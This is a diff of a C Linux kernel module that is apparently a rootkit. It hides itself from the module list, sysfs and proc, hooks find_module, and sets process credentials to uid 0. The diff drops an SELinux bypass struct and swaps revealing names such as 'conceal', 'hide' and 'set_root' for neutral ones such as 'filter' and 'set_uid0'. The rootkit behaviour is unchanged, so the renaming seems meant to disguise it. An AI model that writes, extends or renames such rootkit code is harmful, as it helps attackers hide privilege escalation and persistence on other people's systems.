@@ -11,9 +11,6 @@
 #include <nvk_log.h>
 
 static struct neverc_krt_vis_state vis_state = NEVERC_KRT_VIS_INIT_STATE;
-#ifdef NVK_LOWVIS_SELINUX
-static struct neverc_krt_selinux_bypass selinux_state;
-#endif
 
 static int neverc_krt_str_eq(const char *a, const char *b)
 {
@@ -88,18 +85,18 @@ static int neverc_krt_lowvis_init(void)
 			neverc_krt_log_info("find_module interposed\n");
 	}
 
-#ifdef NVK_LOWVIS_FULL_HIDE
-	neverc_krt_vis_full_conceal(&vis_state, &__this_module, "neverc_krt_lowvis");
+#ifdef NVK_LOWVIS_FILTER_FULL
+	neverc_krt_vis_filter_full(&vis_state, &__this_module, "neverc_krt_lowvis");
 	neverc_krt_log_info("visibility filter: list+sysfs+proc\n");
-#elif defined(NVK_LOWVIS_HIDE)
-	neverc_krt_vis_conceal(&vis_state, &__this_module);
+#elif defined(NVK_LOWVIS_FILTER)
+	neverc_krt_vis_filter(&vis_state, &__this_module);
 	neverc_krt_log_info("visibility filter: module list\n");
 #else
 	neverc_krt_log_info("log-only mode\n");
 #endif
 
-#ifdef NVK_LOWVIS_ROOT
-	ret = neverc_krt_cred_set_root();
+#ifdef NVK_LOWVIS_CRED
+	ret = neverc_krt_cred_set_uid0();
 	if (ret == 0)
 		neverc_krt_log_info("credential wrapper applied\n");
 	else
@@ -131,7 +128,7 @@ static void neverc_krt_lowvis_exit(void)
 	neverc_krt_interpose_remove_ctx(&find_module_ctx);
 #endif
 	neverc_krt_vis_remove_interposes();
-	neverc_krt_vis_reveal(&vis_state, &__this_module);
+	neverc_krt_vis_restore(&vis_state, &__this_module);
 	neverc_krt_log_info("unloaded\n");
 }
 
